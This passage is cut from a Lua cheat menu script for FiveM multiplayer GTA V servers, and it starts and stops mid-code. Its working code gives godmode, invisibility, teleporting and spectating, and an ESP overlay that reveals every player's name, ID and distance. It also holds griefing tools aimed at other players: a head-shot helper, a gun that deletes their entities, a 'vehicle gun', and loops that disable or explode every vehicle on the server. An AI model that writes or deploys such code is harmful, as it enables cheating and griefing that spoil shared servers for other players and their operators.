		debugPrint(tostring(text) .. " checkbox changed to " .. tostring(bool))
		callback(bool)

		return true
	end

	return false
end

function WarMenu.ComboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = "? " .. tostring(selectedItem) .. " ?"
	end

	if WarMenu.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
			if currentIndex > 1 then
				currentIndex = currentIndex - 1
			else
				currentIndex = itemsCount
			end
		elseif currentKey == keys.right then
			if currentIndex < itemsCount then
				currentIndex = currentIndex + 1
			else
				currentIndex = 1
			end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
	return false
end

function WarMenu.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			WarMenu.CloseMenu()
		else
			ClearAllHelpMessages()

			drawTitle()
			drawSubTitle()

			currentKey = nil

			if IsDisabledControlJustPressed(0, keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true)
				else
					WarMenu.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end

function WarMenu.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function WarMenu.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function WarMenu.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function WarMenu.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function WarMenu.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function WarMenu.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"titleBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
	)
end

function WarMenu.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function WarMenu.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function WarMenu.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
	)
end

function WarMenu.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function WarMenu.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function WarMenu.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function WarMenu.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
	AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = true

	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		Citizen.Wait(0)
	end

	if UpdateOnscreenKeyboard() ~= 2 then
		local result = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		blockinput = false
		return result
	else
		Citizen.Wait(500)
		blockinput = false
		return nil
	end
end

local function getPlayerIds()
	local players = {}
	for i = 0, GetNumberOfPlayers() do
		if NetworkIsPlayerActive(i) then
			players[#players + 1] = i
		end
	end
	return players
end


function DrawText3D(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

function drawNotification(text)
	SetNotificationTextEntry("STRING")
	AddTextComponentString(text)
	DrawNotification(false, false)
end

local allWeapons = {
	"WEAPON_KNIFE",
	"WEAPON_KNUCKLE",
	"WEAPON_NIGHTSTICK",
	"WEAPON_HAMMER",
	"WEAPON_BAT",
	"WEAPON_GOLFCLUB",
	"WEAPON_CROWBAR",
	"WEAPON_BOTTLE",
	"WEAPON_DAGGER",
	"WEAPON_HATCHET",
	"WEAPON_MACHETE",
	"WEAPON_FLASHLIGHT",
	"WEAPON_SWITCHBLADE",
	"WEAPON_PISTOL",
	"WEAPON_PISTOL_MK2",
	"WEAPON_COMBATPISTOL",
	"WEAPON_APPISTOL",
	"WEAPON_PISTOL50",
	"WEAPON_SNSPISTOL",
	"WEAPON_HEAVYPISTOL",
	"WEAPON_VINTAGEPISTOL",
	"WEAPON_STUNGUN",
	"WEAPON_FLAREGUN",
	"WEAPON_MARKSMANPISTOL",
	"WEAPON_REVOLVER",
	"WEAPON_MICROSMG",
	"WEAPON_SMG",
	"WEAPON_SMG_MK2",
	"WEAPON_ASSAULTSMG",
	"WEAPON_MG",
	"WEAPON_COMBATMG",
	"WEAPON_COMBATMG_MK2",
	"WEAPON_COMBATPDW",
	"WEAPON_GUSENBERG",
	"WEAPON_MACHINEPISTOL",
	"WEAPON_ASSAULTRIFLE",
	"WEAPON_ASSAULTRIFLE_MK2",
	"WEAPON_CARBINERIFLE",
	"WEAPON_CARBINERIFLE_MK2",
	"WEAPON_ADVANCEDRIFLE",
	"WEAPON_SPECIALCARBINE",
	"WEAPON_BULLPUPRIFLE",
	"WEAPON_COMPACTRIFLE",
	"WEAPON_PUMPSHOTGUN",
	"WEAPON_SAWNOFFSHOTGUN",
	"WEAPON_BULLPUPSHOTGUN",
	"WEAPON_ASSAULTSHOTGUN",
	"WEAPON_MUSKET",
	"WEAPON_HEAVYSHOTGUN",
	"WEAPON_DBSHOTGUN",
	"WEAPON_SNIPERRIFLE",
	"WEAPON_HEAVYSNIPER",
	"WEAPON_HEAVYSNIPER_MK2",
	"WEAPON_MARKSMANRIFLE",
	"WEAPON_GRENADELAUNCHER",
	"WEAPON_GRENADELAUNCHER_SMOKE",
	"WEAPON_RPG",
	"WEAPON_STINGER",
	"WEAPON_FIREWORK",
	"WEAPON_HOMINGLAUNCHER",
	"WEAPON_GRENADE",
	"WEAPON_STICKYBOMB",
	"WEAPON_PROXMINE",
	"WEAPON_BZGAS",
	"WEAPON_SMOKEGRENADE",
	"WEAPON_MOLOTOV",
	"WEAPON_FIREEXTINGUISHER",
	"WEAPON_PETROLCAN",
	"WEAPON_SNOWBALL",
	"WEAPON_FLARE",
	"WEAPON_BALL"
}

local Enabled = true

local function TeleportToWaypoint()
	if DoesBlipExist(GetFirstBlipInfoId(8)) then
		local blipIterator = GetBlipInfoIdIterator(8)
		local blip = GetFirstBlipInfoId(8, blipIterator)
		WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
		wp = true
	else
		drawNotification("~r~No waypoint!")
	end

	local zHeigt = 0.0
	height = 1000.0
	while true do
		Citizen.Wait(0)
		if wp then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					(GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end

			SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
			FreezeEntityPosition(entity, true)
			local Pos = GetEntityCoords(entity, true)

			if zHeigt == 0.0 then
				height = height - 25.0
				SetEntityCoords(entity, Pos.x, Pos.y, height)
				bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
			else
				SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
				FreezeEntityPosition(entity, false)
				wp = false
				height = 1000.0
				zHeigt = 0.0
				drawNotification("~g~Teleported to waypoint!")
				break
			end
		end
	end
end

function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end
	local t = {}
	i = 1
	for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
		t[i] = str
		i = i + 1
	end
	return t
end

local Spectating = false

function SpectatePlayer(player)
	local playerPed = PlayerPedId()
	Spectating = not Spectating
	local targetPed = GetPlayerPed(player)

	if (Spectating) then
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(true, targetPed)

		drawNotification("Spectating " .. GetPlayerName(player))
	else
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(false, targetPed)

		drawNotification("Stopped Spectating " .. GetPlayerName(player))
	end
end

function ShootPlayer(player)
	local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end

function MaxOut(veh)
                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end

function DelVeh(veh)
	SetEntityAsMissionEntity(Object, 1, 1)
	DeleteEntity(Object)
	SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
	DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

function Clean(veh)
	SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
	SetVehicleDirtLevel(veh, 1.0)
end


function RequestControl(entity)
	local Waiting = 0
	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			drawNotification("Hung for 5 seconds, killing to prevent issues...")
		end
	end
end

function getEntity(player)
	local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
	return entity
end

function GetInputMode()
	return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function DrawSpecialText(m_text, showtime)
	SetTextEntry_2("STRING")
	AddTextComponentString(m_text)
	DrawSubtitleTimed(showtime, 1)
end

-- MAIN CODE --


ShowHudComponentThisFrame(14)

Citizen.CreateThread(function() 
	local headId = {}
	while true do
		Citizen.Wait(1)
		if playerBlips then
			-- show blips
			for id = 0, 64 do
				if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
					ped = GetPlayerPed(id)
					blip = GetBlipFromEntity(ped)

					-- HEAD DISPLAY STUFF --

					-- Create head display (this is safe to be spammed)
					headId[id] = CreateMpGamerTag(ped, GetPlayerName( id ), false, false, "", false)
					wantedLvl = GetPlayerWantedLevel(id)

					-- Wanted level display
					if wantedLvl then
						SetMpGamerTagVisibility(headId[id], 7, true) -- Add wanted sprite
						SetMpGamerTagWantedLevel(headId[id], wantedLvl) -- Set wanted number
					else
						SetMpGamerTagVisibility(headId[id], 7, false)
					end

					-- Speaking display
					if NetworkIsPlayerTalking(id) then
						SetMpGamerTagVisibility(headId[id], 9, true) -- Add speaking sprite
					else
						SetMpGamerTagVisibility(headId[id], 9, false) -- Remove speaking sprite
					end

					-- BLIP STUFF --

					if not DoesBlipExist(blip) then -- Add blip and create head display on player
						blip = AddBlipForEntity(ped)
						SetBlipSprite(blip, 1)
						ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
					else -- update blip
						veh = GetVehiclePedIsIn(ped, false)
						blipSprite = GetBlipSprite(blip)
						if not GetEntityHealth(ped) then -- dead
							if blipSprite ~= 274 then
								SetBlipSprite(blip, 274)
								ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
							end
						elseif veh then
							vehClass = GetVehicleClass(veh)
							vehModel = GetEntityModel(veh)
							if vehClass == 15 then -- Helicopters
								if blipSprite ~= 422 then
									SetBlipSprite(blip, 422)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 8 then -- Motorcycles
								if blipSprite ~= 226 then
									SetBlipSprite(blip, 226)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 16 then -- Plane
								if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
									if blipSprite ~= 424 then
										SetBlipSprite(blip, 424)
										ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
									end
								elseif blipSprite ~= 423 then
									SetBlipSprite(blip, 423)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 14 then -- Boat
								if blipSprite ~= 427 then
									SetBlipSprite(blip, 427)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
								if blipSprite ~= 460 then
									SetBlipSprite(blip, 460)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("rhino") then -- Tank
								if blipSprite ~= 421 then
									SetBlipSprite(blip, 421)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
								if blipSprite ~= 318 then
									SetBlipSprite(blip, 318)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("pbus") then -- Prison Bus
								if blipSprite ~= 513 then
									SetBlipSprite(blip, 513)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
								if blipSprite ~= 471 then
									SetBlipSprite(blip, 471)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
								if blipSprite ~= 481 then
									SetBlipSprite(blip, 481)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
								if blipSprite ~= 198 then
									SetBlipSprite(blip, 198)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
								or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
								or vehModel == GetHashKey("policeold2") or vehModel == GetHashKey("policeold1") then
								if blipSprite ~= 56 then
									SetBlipSprite(blip, 56)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
							end

							-- Show number in case of passangers
							passengers = GetVehicleNumberOfPassengers(veh)

							if passengers then
								if not IsVehicleSeatFree(veh, -1) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip(blip, passengers)
							else
								HideNumberOnBlip(blip)
							end
						else
							-- Remove leftover number
							HideNumberOnBlip(blip)
							if blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
							end
						end
						
						SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
						SetBlipNameToPlayerName(blip, id) -- update blip name
						SetBlipScale(blip,  0.85) -- set scale

						-- set player alpha
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
							distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							-- Probably a way easier way to do this but whatever im an idiot

							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha(blip, distance)
						end
					end
				end
			end
		else
			for id = 0, 64 do
				ped = GetPlayerPed(id)
				blip = GetBlipFromEntity(ped)
				if DoesBlipExist(blip) then -- Removes blip
				--	RemoveBlip(blip)
				end
--				if IsMpGamerTagActive(headId[id]) then
	--				RemoveMpGamerTag(headId[id])
	--			end
			end
		end
	end
end)



Citizen.CreateThread(
	function()
		while Enabled do
			Citizen.Wait(0)
			SetPlayerInvincible(PlayerId(), Godmode)
			SetEntityInvincible(PlayerPedId(), Godmode)
			if SuperJump then
				SetSuperJumpThisFrame(PlayerId())
			end

			if InfStamina then
				RestorePlayerStamina(PlayerId(), 1.0)
			end

			if Invisible then
				SetEntityVisible(GetPlayerPed(-1), false, 0)
			else
				SetEntityVisible(GetPlayerPed(-1), true, 0)
			end

			if fastrun then
				SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
				SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
			else
				SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
				SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
			end

			if VehicleGun then
				local VehicleGunVehicle = "Freight"
				local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
						if IsPedShooting(GetPlayerPed(-1)) then
							while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
								Citizen.Wait(0)
								RequestModel(GetHashKey(VehicleGunVehicle))
							end
							local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
							SetEntityAsNoLongerNeeded(veh)
							SetVehicleForwardSpeed(veh, 150.0)
						end
					end
				end
			end

			if DeleteGun then
				local gotEntity = getEntity(PlayerId())
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
						if IsPlayerFreeAiming(PlayerId()) then
							if IsEntityAPed(gotEntity) then
								if IsPedInAnyVehicle(gotEntity, true) then
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
										DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								else
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								end
							else
								if IsControlJustReleased(1, 142) then
									SetEntityAsMissionEntity(gotEntity, 1, 1)
									DeleteEntity(gotEntity)
									drawNotification("~g~Deleted!")
								end
							end
						end
					end
				end
			end

			if destroyvehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
						NetworkRequestControlOfEntity(vehicle)
						SetVehicleUndriveable(vehicle,true)
						SetVehicleEngineHealth(vehicle, 100)
					end
				end
			end
			

			if explodevehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
						NetworkRequestControlOfEntity(vehicle)
						NetworkExplodeVehicle(vehicle, true, true, false)
					end
				end
			end

			if esp then
				for i = 0, 64 do
					if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
						local ra = RGBRainbow(1.0)
						local pPed = GetPlayerPed(i)
						local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
						local x, y, z = table.unpack(GetEntityCoords(pPed))
						local message =
							"~h~Name: " ..
							GetPlayerName(i) ..
								"\nServer ID: " ..
									GetPlayerServerId(i) ..
										"\nPlayer ID: " .. i .. "\nDist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
						if IsPedInAnyVehicle(pPed, true) then
							local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
							message = message .. "\nVeh: " .. VehName
						end
						DrawText3D(x, y, z + 1.0, message, ra.r, ra.g, ra.b)

						LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
